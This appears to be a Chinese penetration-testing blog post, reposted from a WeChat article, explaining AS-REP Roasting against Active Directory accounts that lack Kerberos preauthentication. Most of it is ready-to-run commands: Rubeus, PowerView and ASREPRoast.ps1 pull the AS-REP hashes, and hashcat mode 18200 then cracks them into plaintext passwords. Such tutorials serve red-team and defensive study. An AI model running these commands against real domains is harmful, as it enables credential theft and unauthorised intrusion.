---
title: "内网渗透-AS-REPRoasting"
date: 2020-08-31 11:56:23 +0800
category: 内网渗透
tags: [内网,域]
excerpt: 内网渗透-AS-REPRoasting
---
# AS-REPRoasting
## 原理
对于域用户，如果设置了选项”Do not require Kerberos preauthentication(不需要kerberos预身份验证)”，此时向域控制器的88端口发送AS_REQ请求，对收到的AS_REP内容(enc-part底下的ciper，因为这部分是使用用户hash加密session-key，我们通过进行离线爆破就可以获得用户hash)重新组合，能够拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，接下来可以使用hashcat对其破解，最终获得该用户的明文口令
![](https://p5.ssl.qhimg.com/t014ca76343bf5ba087.png)

## 利用
### 普通域用户
#### Rubeus.exe
1：使用rubeus.exe获得Hash

> 这个功能会通过LDAP查询域内用户设置了选项”Do not require Kerberos preauthentication”，然后发AS_REQ的包，直接生成hash或者john可破解的格式
```
Rubeus.exe asreproast
or
Rubeus.exe asreproast > hash.txt
```
2：使用hashcat对获得的Hash进行爆破
将hash.txt里面的除Hash字段其他的都删除，复制到hashcat目录下，并且修改为hashcat能识别的格式，在$krb5asrep后面添加$23拼接。
![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFiaHxdwPJibRNZK6jvZIrRBFX3eVBSrs0OhWVWZ83WD7hJ2NIicAB3RmUkB3m7oJR0LDg1X73ERIjYTA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)
然后使用以下命令爆破

```
 hashcat64.exe -m 18200 hash.txt pass.txt --force
```
![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFiaHxdwPJibRNZK6jvZIrRBFX6oP4eYRXwxZKEGELE7mOpfplfLw384xW222XgqnMm5LRVHE3ibo3fvA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)
![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFiaHxdwPJibRNZK6jvZIrRBFXYLdr8le2toyvNKSCtGyjm8LPh7bsPQREM2wvVYS2FwVTPQn5qlmbrQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

#### powershell脚本

1：使用[PowerSploit](https://github.com/PowerShellMafia/PowerSploit)下的powerview.ps1查找域中设置了 "不需要kerberos预身份验证" 的用户
https://github.com/PowerShellMafia/PowerSploit/blob/445f7b2510c4553dcd9451bc4daccb20c8e67cbb/Recon/PowerView.ps1

```
Import-Module .\PowerView.ps1
Get-DomainUser -PreauthNotRequired -Verbose
//只显示distinguishedname项：
Import-Module .\PowerView.ps1
Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
```
 ![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFiaHxdwPJibRNZK6jvZIrRBFXfMZxzN9R9QthfaZ6ibWfrzwyjNOfchVDFOHZecnP7MJgcEWLziaajic2A/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

2：使用ASREPRoast.ps1获取AS-REP返回的Hash

```
Import-Module .\ASREPRoast.ps1
Get-ASREPHash -UserName hack2 -Domain xie.com | Out-File -Encoding ASCII hash.txt
```
3：使用hashcat对获得的Hash进行爆破
将hash.txt复制到hashcat目录下，并且修改为hashcat能识别的格式，在$krb5asrep后面添加$23拼接。然后使用以下命令爆破。
```
hashcat64.exe -m 18200 hash.txt pass.txt --force
```
### 非域内机器
1：对于非域内的机器，无法通过LDAP来发起用户名的查询。
2：所以要想获取 "不需要kerberos预身份验证" 的域内账号，只能通过枚举用户名的方式来获得。而AS-REP Hash方面。非域内的主机，只要能和DC通信，便可以获取到。使用Get-ASREPHash，通过指定Server的参数即可

```
Import-Module .\ASREPRoast.ps1
Get-ASREPHash -UserName hack2 -Domain xie.com -Server 192.168.10.131 | Out-File -Encoding ASCII hash.txt
```
3：获取到Hash后，使用hashcat对其爆破，和上面一样，这里就不演示了。

```
hashcat64.exe -m 18200 hash.txt pass.txt --force
```
转自:https://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247489128&idx=1&sn=dac676323e81307e18dd7f6c8998bde7&chksm=fc7812b5cb0f9ba3a63c447468b7e1bdf3250ed0a6217b07a22819c816a8da1fdf16c164fce2&scene=21#wechat_redirect
